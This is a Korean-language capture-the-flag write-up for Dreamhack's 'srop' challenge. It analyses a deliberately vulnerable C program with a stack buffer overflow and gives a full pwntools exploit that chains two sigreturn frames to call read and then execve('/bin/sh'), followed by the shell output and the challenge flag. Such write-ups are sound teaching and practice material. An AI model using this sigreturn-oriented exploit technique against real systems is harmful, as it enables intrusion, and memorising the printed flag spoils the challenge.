# ✏️ SigReturn-Oriented Programming Write-up
https://dreamhack.io/wargame/challenges/364/

## 📄 Vulnerability & Code Analysis
주어진 함수의 보호기법은 다음과 같다.
NO PIE이므로 바이너리 내부 코드 영역의 주소가 고정되므로    
`gadget()` 함수 내부의 `pop rax; syscall; ret` 가젯 주소와 `.bss` 주소를 고정된 값으로 사용할 수 있다.
또한 NX가 활성화되어 있으므로 스택에 셸코드를 직접 삽입하고 실행하는 방식은 사용할 수 없다.
그러나 ret2libc, ROP, SROP처럼 기존 코드 영역을 재사용하는 공격은 가능하다. 

```bash
(.venv) (base) ➜  srop checksec ./srop
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/daniel/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.15.0)
[*] '/home/daniel/dreamhack/pwn/srop/srop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
```c
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024);
}
```
주어진 문제 파일의 소스 코드를 보면 사용할 수 있는 gadget이 주어져있고
main 함수를 보면 주어진 buf는 16byte인데 1024byte를 입력할 수 있으므로 
stack buffer overflow 공격이 가능하다.   
따라서 주어진 gadget 함수의 코드를 이용해서
sigreturn systemcall을 호출하여 레지스터를 조작하여 셸을 딸 수 있다.

## 🗡️ Exploit / Solver Strategy
### 1. sigretrun 호출
SROP를 하기 위해 sigreturn systemcall을 호출
system call은 `syscall table`에 번호로 관리
`rt_sigreturn = 15`이고 `gadget`을 이용해서  

```
ret → pop rax; syscall; ret
pop rax → rax = 15
syscall → rt_sigreturn 호출
```
fake sigreturn frame을 stack에 배치하여 
`rax`, `rdi`, `rsi`, `rdx`, `rip`, `rsp`등의 레지스터 값을 원하는 값으로 조작하고, 
`read(0, bss, 0x400);` 의 syscall이 실행되도록 만든다.

따라서 payload를 다음과 같이 구성한다.
```python
pop_rax_syscall_ret = next(e.search(asm('pop rax; syscall; ret')))
syscall_ret = next(e.search(asm('syscall; ret')))
bss = e.bss() + 0x500

frame = SigreturnFrame()
frame.rax = 0              # read syscall
frame.rdi = 0              # stdin
frame.rsi = bss            # read 결과를 저장할 곳
frame.rdx = 0x400          # 읽을 크기
frame.rip = syscall_ret    # syscall; ret
frame.rsp = bss            # read가 끝난 뒤 ret할 스택 위치

payload = b'A' * 16
payload += b'B' * 8
payload += p64(pop_rax_syscall_ret)
payload += p64(15)
payload += bytes(frame)
p.send(payload)
```

### 2. execve 호출
이제 `.bss` 영역에 payload를 저장하여 `read`이후에 `ret`이 `.bss`의 첫 값을 `rip`로 사용하기 위해 `rsp = bss`로 만든다.
1차 SROP로 인해 프로그램이 `read(0, bss, 0x400)`을 실행하므로
2차 payload는 그대로 `.bss`영역에 저장된다.
즉, `execve("/bin/sh", 0, 0)`을 호출하여 셸을 따는 과정이다.
Linux x86-64에서 `execve`의 syscall number는 `59`이므로
2차 payload구성은 다음과 같다.
```python
binsh = bss + 0x200
frame2 = SigreturnFrame()
frame2.rax = 59             # execve syscall
frame2.rdi = binsh         # "/bin/sh" 문자열의 주소
frame2.rsi = 0             # argv
frame2.rdx = 0             # envp
frame2.rip = syscall_ret   # syscall; ret

payload2 = b''
payload2 += p64(pop_rax_syscall_ret)
payload2 += p64(15)
payload2 += bytes(frame2)
payload2 = payload2.ljust(0x200, b'\x00')
payload2 += b'/bin/sh\x00'
p.send(payload2)
```
여기서 `/bin/sh` 문자열이 정확하게 이전에 설정한 `.bss + 0x200` 위치에 들어가도록 `ljust()`를 사용한다.
결과적으로 `.bss` 영역은
```
bss + 0x000 : pop_rax_syscall_ret
bss + 0x008 : 15
bss + 0x010 : fake sigreturn frame for execve
...
bss + 0x200 : "/bin/sh\x00"
```
와 같은 구조가 되어 최종적으로 셸을 딸 수 있다.

## 💻 Final Payload or Solver
```python
from pwn import *
p = remote('host3.dreamhack.games', 19520)
e = ELF('./srop')
context.arch = 'amd64'

pop_rax_syscall_ret = next(e.search(asm('pop rax; syscall; ret')))
syscall_ret = next(e.search(asm('syscall; ret')))
bss = e.bss() + 0x500

frame = SigreturnFrame()
frame.rax = 0              # read syscall
frame.rdi = 0              # stdin
frame.rsi = bss            # read 결과를 저장할 곳
frame.rdx = 0x400          # 읽을 크기
frame.rip = syscall_ret    # syscall; ret
frame.rsp = bss            # read가 끝난 뒤 ret할 스택 위치

payload = b'A' * 16
payload += b'B' * 8
payload += p64(pop_rax_syscall_ret)
payload += p64(15)
payload += bytes(frame)
p.send(payload)

binsh = bss + 0x200
frame2 = SigreturnFrame()
frame2.rax = 59             # execve syscall
frame2.rdi = binsh         # "/bin/sh" 문자열의 주소
frame2.rsi = 0             # argv
frame2.rdx = 0             # envp
frame2.rip = syscall_ret   # syscall; ret

payload2 = b''
payload2 += p64(pop_rax_syscall_ret)
payload2 += p64(15)
payload2 += bytes(frame2)
payload2 = payload2.ljust(0x200, b'\x00')
payload2 += b'/bin/sh\x00'
p.send(payload2)
p.interactive()
```

## 🏳️ cat flag
```bash
(base) ➜  srop pypwn srop.py
[+] Opening connection to host3.dreamhack.games on port 19520: Done
[*] '/home/daniel/dreamhack/pwn/srop/srop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Switching to interactive mode
$ cat flag
DH{9bca8b793b7415a5452a4ba4f7945315e1a99a0d91c67ca27d45746f73f479b8}
$
```
